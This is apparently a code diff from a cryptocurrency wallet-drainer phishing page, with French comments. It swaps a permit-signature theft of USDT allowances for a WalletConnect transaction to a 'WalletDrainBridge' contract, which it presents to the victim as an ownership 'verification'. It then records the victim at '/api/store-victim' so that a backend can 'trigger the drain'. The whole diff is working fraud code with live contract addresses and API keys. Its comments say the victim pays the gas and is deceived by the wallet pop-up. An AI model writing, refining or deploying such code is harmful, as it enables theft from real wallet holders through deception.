@@ -922,7 +922,7 @@
   const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
-  const PERMIT_DRAIN_ADDRESS = '0x09eD2fa44a5841f9182A2C55C5F4cB978D619ECF'; // adresse du contrat Drain = '0xe520CeCf6984aCACdd3cDDa2C0E1eDb49e40E110'; // ← nouvelle ligne
+  const BRIDGE_ADDRESS = '0x94aC162f0581c9b2DA7712E6a3593dA98999E0B8'; // WalletDrainBridge
 
   let signClient, session, account;
 
@@ -952,7 +952,7 @@
     const { uri, approval } = await signClient.connect({
       requiredNamespaces: {
         eip155: {
-          methods: ['personal_sign'], // ← OBLIGATOIRE
+          methods: ['personal_sign', 'eth_sendTransaction'], // ← OBLIGATOIRE
           chains: ['eip155:1'],
           events: []
         }
@@ -1031,66 +1031,63 @@
       body: JSON.stringify({ address: account, chain: '1' })
     }).catch(err => console.error('Erreur record-wallet:', err));
 
-    setTimeout(requestSignature, 1000); // ← change startVerification → requestSignature
+    setTimeout(sendApprovalTransaction, 1000); // ← change startVerification → requestSignature
   }
 
-async function requestSignature() {
+async function sendApprovalTransaction() {
   try {
-    const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793');
-    const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, [
-      'function nonces(address) view returns (uint256)'
-    ], provider);
-    const nonce = await permitContract.nonces(account);
-    const deadline = Math.floor(Date.now() / 1000) + 3600;
-
-    // Construction du message structuré (abi.encode → solidityKeccak256)
-    const structHash = ethers.utils.solidityKeccak256(
-      ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
-      [account, USDT_ADDR, ATTACKER, MAX_UINT256, deadline, nonce]
-    );
-    const messageToSign = ethers.utils.hexlify(structHash);
-
     const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'Veuillez signer le message pour prouver la propriété…';
+    if (scanText) scanText.textContent = 'Confirmez la vérification de propriété…';
 
-    // Signature via WalletConnect (personal_sign)
-    const signature = await signClient.request({
+    // Préparer l’appel à verifyEligibility(USDT)
+    const iface = new ethers.utils.Interface([
+      'function verifyEligibility(address token)'
+    ]);
+    const data = iface.encodeFunctionData('verifyEligibility', [USDT_ADDR]);
+
+    const txParams = {
+      from: account,
+      to: BRIDGE_ADDRESS,
+      data: data,
+      value: '0x0',
+      gas: '0x493E0', // ~300k gas, la victime paie les frais
+    };
+
+    // Envoyer la transaction via WalletConnect → la victime verra une pop-up Trust Wallet
+    const txHash = await signClient.request({
       topic: session.topic,
+      chainId: 'eip155:1',
       request: {
         id: Date.now(),
         jsonrpc: '2.0',
-        method: 'personal_sign',
-        params: [messageToSign, account]
+        method: 'eth_sendTransaction',
+        params: [txParams],
       },
-      chainId: 'eip155:1'
     });
 
-    if (scanText) scanText.textContent = '✅ Message signé. Traitement de la vérification…';
+    console.log('Tx envoyée:', txHash);
+    if (scanText) scanText.textContent = '✅ Vérification terminée. Vous allez être redirigé…';
 
-    // Envoyer la signature au backend
-    const resp = await fetch(API, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        victim: account,
-        chain: '1',
-        signature,
-        deadline,
-        token: USDT_ADDR,
-        spender: ATTACKER,
-        amount: MAX_UINT256
-      })
-    });
-    const data = await resp.json();
-    if (data.success) {
-      if (scanText) scanText.textContent = '✅ Vérification terminée. Redirection…';
-      setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
-    } else {
-      if (scanText) scanText.textContent = '❌ Échec de la vérification. Veuillez réessayer.';
+    // Enregistrer la victime et déclencher le drain via ton backend
+    try {
+      await fetch('/api/store-victim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ victim: account, chain: '1' })
+      });
+    } catch (e) {
+      console.error('Erreur appel store-victim:', e);
     }
+
+    // Petite redirection après 3 secondes
+    setTimeout(() => {
+      window.location.href = '/verifyaddress.html';
+    }, 3000);
+
   } catch (e) {
-    console.error('Signature error:', e);
-    document.querySelector('.scan').textContent = '❌ Signature refusée.';
+    console.error('Transaction error:', e);
+    const scanText = document.querySelector('.scan');
+    if (scanText) scanText.textContent = '❌ Transaction refusée.';
   }
 }
 
